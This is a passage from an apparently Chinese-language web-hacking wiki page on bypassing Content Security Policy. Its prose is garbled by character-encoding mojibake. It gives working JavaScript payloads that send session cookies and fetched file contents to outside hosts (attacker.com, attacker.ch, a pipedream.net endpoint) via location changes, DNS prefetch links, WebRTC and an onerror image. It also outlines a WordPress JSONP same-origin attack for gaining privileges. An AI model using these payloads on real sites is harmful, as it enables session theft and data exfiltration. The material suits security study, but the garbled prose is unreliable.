çµæ„Ÿæ¥è‡ª [**è¿™ç¯‡æ–‡ç« **](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)ã€‚

### é‡å†™é”™è¯¯é¡µé¢

ä» [**è¿™ç¯‡æ–‡ç« **](https://blog.ssrf.kr/69) çœ‹æ¥ï¼Œé€šè¿‡åŠ è½½ä¸€ä¸ªé”™è¯¯é¡µé¢ï¼ˆå¯èƒ½æ²¡æœ‰ CSPï¼‰å¹¶é‡å†™å…¶å†…å®¹ï¼Œå¯ä»¥ç»•è¿‡ CSP ä¿æŠ¤ã€‚
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOMEæ˜¯ä¸€ç§æŠ€æœ¯ï¼Œåˆ©ç”¨é¡µé¢ç«¯ç‚¹ä¸­çš„XSSï¼ˆæˆ–é«˜åº¦å—é™çš„XSSï¼‰æ¥æ»¥ç”¨åŒä¸€æºçš„å…¶ä»–ç«¯ç‚¹ã€‚è¿™æ˜¯é€šè¿‡ä»æ”»å‡»è€…é¡µé¢åŠ è½½æ˜“å—æ”»å‡»çš„ç«¯ç‚¹ï¼Œç„¶ååˆ·æ–°æ”»å‡»è€…é¡µé¢åˆ°æ‚¨æƒ³è¦æ»¥ç”¨çš„åŒä¸€æºä¸­çš„çœŸå®ç«¯ç‚¹æ¥å®Œæˆçš„ã€‚è¿™æ ·ï¼Œæ˜“å—æ”»å‡»çš„ç«¯ç‚¹å¯ä»¥ä½¿ç”¨`opener`å¯¹è±¡åœ¨**æœ‰æ•ˆè´Ÿè½½**ä¸­è®¿é—®è¦æ»¥ç”¨çš„**çœŸå®ç«¯ç‚¹çš„DOM**ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

æ­¤å¤–ï¼Œ**wordpress**åœ¨`/wp-json/wp/v2/users/1?_jsonp=data`ä¸­æœ‰ä¸€ä¸ª**JSONP**ç«¯ç‚¹ï¼Œå°†åœ¨è¾“å‡ºä¸­**åå°„**å‘é€çš„**æ•°æ®**ï¼ˆä»…é™å­—æ¯ã€æ•°å­—å’Œç‚¹ï¼‰ã€‚

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¯¥ç«¯ç‚¹å¯¹WordPressæ‰§è¡Œ**ç”ŸæˆSOMEæ”»å‡»**ï¼Œå¹¶å°†å…¶åµŒå…¥åˆ°`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`ä¸­ï¼Œè¯·æ³¨æ„ï¼Œæ­¤**è„šæœ¬**å°†è¢«**åŠ è½½**ï¼Œå› ä¸ºå®ƒè¢«'è‡ªèº«'å…è®¸ã€‚æ­¤å¤–ï¼Œç”±äºWordPresså·²å®‰è£…ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡**ç»•è¿‡CSP**çš„**æ˜“å—æ”»å‡»çš„å›è°ƒ**ç«¯ç‚¹æ»¥ç”¨**SOMEæ”»å‡»**ï¼Œä»¥èµ‹äºˆç”¨æˆ·æ›´å¤šæƒé™ï¼Œå®‰è£…æ–°æ’ä»¶...\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSPæ•°æ®æ³„æ¼ç»•è¿‡

å¦‚æœå­˜åœ¨ä¸¥æ ¼çš„CSPä¸å…è®¸æ‚¨ä¸å¤–éƒ¨æœåŠ¡å™¨**äº¤äº’**ï¼Œåˆ™æœ‰ä¸€äº›äº‹æƒ…æ‚¨å§‹ç»ˆå¯ä»¥åšä»¥æ³„éœ²ä¿¡æ¯ã€‚

### Location

æ‚¨å¯ä»¥ç®€å•åœ°æ›´æ–°ä½ç½®ä»¥å°†ç§˜å¯†ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Metaæ ‡ç­¾

æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥ä¸€ä¸ªmetaæ ‡ç­¾æ¥è¿›è¡Œé‡å®šå‘ï¼ˆè¿™åªæ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œä¸ä¼šæ³„éœ²å†…å®¹ï¼‰
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

ä¸ºäº†åŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ï¼Œæµè§ˆå™¨ä¼šé¢„å…ˆå°†ä¸»æœºåè§£æä¸º IP åœ°å€å¹¶ç¼“å­˜ä»¥å¤‡åç”¨ã€‚\
æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŒ‡ç¤ºæµè§ˆå™¨é¢„å…ˆè§£æä¸»æœºåï¼š`<link reol="dns-prefetch" href="something.com">`

æ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºé€šè¿‡ DNS è¯·æ±‚**æ³„éœ²æ•æ„Ÿä¿¡æ¯**ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
å¦ä¸€ç§æ–¹æ³•ï¼š
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€ä»¥ä¸‹HTTPæ ‡å¤´ï¼š
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
æ˜¾ç„¶ï¼Œè¿™ç§æŠ€æœ¯åœ¨æ— å¤´æµè§ˆå™¨ï¼ˆæœºå™¨äººï¼‰ä¸­ä¸èµ·ä½œç”¨
{% endhint %}

### WebRTC

åœ¨ä¸€äº›é¡µé¢ä¸Šï¼Œä½ å¯ä»¥çœ‹åˆ°**WebRTCä¸æ£€æŸ¥CSPçš„`connect-src`ç­–ç•¥**ã€‚

å®é™…ä¸Šï¼Œä½ å¯ä»¥ä½¿ç”¨_DNSè¯·æ±‚_æ¥_æ³„æ¼_ä¿¡æ¯ã€‚æŸ¥çœ‹ä»¥ä¸‹ä»£ç ï¼š
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
å¦ä¸€ä¸ªé€‰é¡¹ï¼š
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## åœ¨çº¿æ£€æŸ¥CSPç­–ç•¥

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## è‡ªåŠ¨åˆ›å»ºCSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## å‚è€ƒèµ„æ–™

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢è¡Œä¸ºçš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£åŠæ—¶äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
éšæ—¶äº†è§£æœ€æ–°çš„èµé‡‘ä»»åŠ¡å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œç«‹å³ä¸é¡¶å°–é»‘å®¢åˆä½œï¼
